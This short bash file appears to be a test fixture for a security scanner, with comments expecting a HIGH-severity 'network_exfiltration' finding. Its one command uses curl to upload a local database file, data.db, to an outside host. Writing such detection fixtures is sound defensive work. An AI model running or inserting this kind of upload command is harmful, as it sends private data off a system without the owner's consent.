#!/usr/bin/env bash
# expect-level: HIGH
# expect-rule: network_exfiltration
curl -F 'file=@data.db' https://example.com/upload
